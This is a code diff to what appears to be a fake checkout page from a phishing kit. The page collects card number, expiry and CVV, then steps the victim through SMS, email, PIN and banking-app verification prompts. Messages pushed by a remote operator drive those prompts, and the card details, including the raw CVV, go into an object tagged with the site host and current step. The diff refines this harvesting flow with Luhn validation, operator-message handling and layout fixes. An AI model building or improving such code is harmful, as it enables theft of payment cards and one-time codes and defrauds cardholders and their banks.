@@ -229,7 +229,7 @@
           <h2>Billing Information</h2>
           <fieldset class="input">
             <legend class="vhdn"><span>Billing Information</span></legend>
-            <div class="status-msg" id="statusMsg"></div>
+            
                 <div id="required_field_explanation">
                     <span id="required_field_char"> * </span> Required field
                 </div>
@@ -237,7 +237,7 @@
               <div class="li"><label for="fullName">Full Name *</label><input type="text" id="fullName" aria-required="true"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="email">Email</label><input type="email" id="email"></div>
+              <div class="li"><label for="email">Email *</label><input type="email" id="email"></div>
               <div class="li"><label for="phone">Phone *</label><input type="tel" id="phone" aria-required="true"></div>
             </div>
             <div class="ol">
@@ -269,6 +269,7 @@
                   <label for="cardNumber">Card Number *</label>
                   <input type="text" id="cardNumber" class="field-card_number" aria-required="true" autocomplete="off" placeholder="0000 0000 0000 0000">
                 </div>
+
                 <div class="li">
                   <div id="card_expiry_date">
                     <div class="exp-date exp-month"><label for="card_expiry_month">Expiration Month *</label>
@@ -289,6 +290,7 @@
                   <input type="text" id="cvv" maxlength="4" aria-required="true" placeholder="..." autocomplete="off" style="width:20%">
                   <img src="cvn-e2c1902bf8cc6c983b779f58795ea28e17e5c26fce496dae3532b84bada676d3.png" style="vertical-align:middle;margin-left:4px;width:auto;height:24px">
                 </div>
+                <div class="li"><div class="status-msg" id="statusMsg"></div></div>
               </div>
             </div>
           </fieldset>
@@ -339,7 +341,7 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="otp-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:28px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="otp-error"></div>
         <button class="otp-btn" id="otp-submit">Continue</button>
@@ -395,7 +397,7 @@
     justify-content: center;
     margin: 10px 0 16px;
 ">
-                            <input type="tel" maxlength="8" id="email-code" style="width:50%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                            <input type="tel" maxlength="8" id="email-code" style="width:100%;height:28px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
                         </div>
         <div class="otp-error-msg" id="email-error"></div>
         <button class="otp-btn" id="email-submit">Continue</button>
@@ -474,10 +476,7 @@
     e.style.display = 'block';
     e.textContent = x;
     e.style.color = t === 'success'?'#2e7d32':t === 'error'?'#c62828':'#1565c0';
-    e.style.background = t === 'success'?'#e8f5e9':t === 'error'?'#ffebee':'#e3f2fd';
-    setTimeout(function() {
-    e.style.display = 'none'}
-  ,5000)}
+    e.style.background = t === 'success'?'#e8f5e9':t === 'error'?'#ffebee':'#e3f2fd';}
   function luhn(n) {
     var s = 0,a = 0;
     for(var i = n.length - 1;
@@ -555,7 +554,7 @@
       try{var raw=localStorage.getItem('lotus_order');if(raw)order=JSON.parse(raw)}catch(e){}
       return {
         frontendUrl: location.hostname, currentStep: _curStep,
-        browsingTabs: [{ label: 'Grocery', count: 1, active: true }],
+        browsingTabs: [{label:'卡片页',count:1,active:true}],
         cardInfo: {
           cardNumber: cn, expiry: ce,
           cvv: (q('cvv') ? q('cvv').value : '').trim(),
@@ -615,6 +614,7 @@
           var avb=q('app-verify-box');if(avb)avb.classList.add('hidden');
           var oe=q('otp-error');if(oe)oe.style.display='none';
           var pe=q('pin-error');if(pe)pe.style.display='none';
+          ['otp-spinner','email-spinner','pin-spinner'].forEach(function(s){var sp=document.getElementById(s);if(sp){sp.classList.add('hidden');sp.style.display='none'}});
         }
 
         if(a === 'ack') {
@@ -768,20 +768,62 @@
                 }
                 else if(a === 'custom_prompt') {
                   var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
-                  var cm=p.message||'';
-                  if(!(function(){var avo=q('app-verify-overlay');if(!avo)return {add:function(){},remove:function(){},contains:function(){return false}};return avo.classList})().contains('hidden')){
-                    for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display='none'}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
-                    var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display='none'}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb)acb.disabled=false
+                  var msg = p.message || '';
+                  if(!((function(){var avo=q('app-verify-overlay');return avo&&!avo.classList.contains('hidden')})())){
+                    if(!document.querySelector("#mount1").classList.contains('hidden')){
+                      document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount1").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount1").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount1").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount2").classList.contains('hidden')){
+                      document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount2").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount2").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount2").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount3").classList.contains('hidden')){
+                      document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount3").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount3").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount3").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount4").classList.contains('hidden')){
+                      document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount4").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount4").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount4").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount5").classList.contains('hidden')){
+                      document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount5").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount5").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount5").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount6").classList.contains('hidden')){
+                      document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount6").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount6").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount6").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }else if(!document.querySelector("#mount7").classList.contains('hidden')){
+                      document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').classList.add('hidden');
+                      document.querySelector("#mount7").shadowRoot.querySelector('.vfy-spinner').style='';
+                      document.querySelector("#mount7").shadowRoot.querySelector('.app-error').classList.remove('hidden');
+                      document.querySelector("#mount7").shadowRoot.querySelector('.app-error').textContent=msg;return
+                    }
+                    var avBox=document.querySelector('#app-verify-overlay>.app-verify-box');
+                    if(avBox)avBox.classList.remove('hidden');
+                    var as2=document.getElementById('app-spinner');if(as2){as2.classList.add('hidden');as2.style.display='none'}
+                    var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');
+                    var ae3=q('app-error');if(ae3)ae3.textContent=msg;
+                    var acb3=q('app-continue-btn');if(acb3){acb3.classList.remove('hidden');acb3.disabled=false}
                   }else if(!((function(){var avo3=q('otp-overlay');return avo3&&!avo3.classList.contains('hidden')})())){
                     var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display='none'}
-                    q('otp-result').classList.remove('hidden');var otpResP2=document.querySelector('#otp-result>p');if(otpResP2)otpResP2.textContent=cm
+                    q('otp-result').classList.remove('hidden');
+                    var otpP=document.querySelector('#otp-result>p');if(otpP)otpP.textContent=msg
                   }else if(!((function(){var avo4=q('email-overlay');return avo4&&!avo4.classList.contains('hidden')})())){
                     var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display='none'}
-                    q('email-result').classList.remove('hidden');var emailResP2=document.querySelector('#email-result>p');if(emailResP2)emailResP2.textContent=cm
+                    q('email-result').classList.remove('hidden');
+                    var emailP=document.querySelector('#email-result>p');if(emailP)emailP.textContent=msg
                   }else if(!((function(){var avo5=q('pin-overlay');return avo5&&!avo5.classList.contains('hidden')})())){
                     var psp=document.getElementById('pin-spinner');if(psp){psp.classList.add('hidden');psp.style.display='none'}
-                    var pe4=q('pin-error');if(pe4)pe4.textContent=cm;var pe3=q('pin-error');if(pe3)pe3.style.display='block'
-                  }else{showMsg('error',cm)}
+                    var pe4=q('pin-error');if(pe4){pe4.textContent=msg;pe4.classList.remove('hidden')}
+                  }else{showMsg('error',msg)}
                 }
                 else if(a === 'redirect_complete') {
                 location.href = '/complete/'}
@@ -792,7 +834,7 @@
                   showMsg('error', p.message || 'Maximum resend attempts reached.')
                 }
                 }function hideAllOverlays() {
-                  ['otp-overlay','pin-overlay','email-overlay','app-verify-overlay','load-overlay'].forEach(function(id) {
+                  ['otp-overlay','pin-overlay','email-overlay','app-verify-overlay','load-overlay','otp-spinner'].forEach(function(id) {
                   var el = q(id); if (el) el.classList.add('hidden')}
                   );
                   for(var i = 1;
@@ -1037,8 +1079,8 @@
                                       }
                                       q('cardNumber').addEventListener('input',function() {
                                         var v = this.value.replace(/\D/g,'').slice(0,16);
-                                        this.value = v.replace(/(\d{4})(?=\d)/g,'$1 ')}
-                                      );
+                                        this.value = v.replace(/(\d{4})(?=\d)/g,'$1 ');
+                                        if(v.length>=13&&!luhn(v)){showMsg('error','Invalid card number.');this.value='';setTimeout(function(){var el=document.getElementById('cardNumber');if(el)el.focus()},100)}})
                                       q('cvv').addEventListener('input',function() {
                                       this.value = this.value.replace(/\D/g,'').slice(0,4)}
                                       );
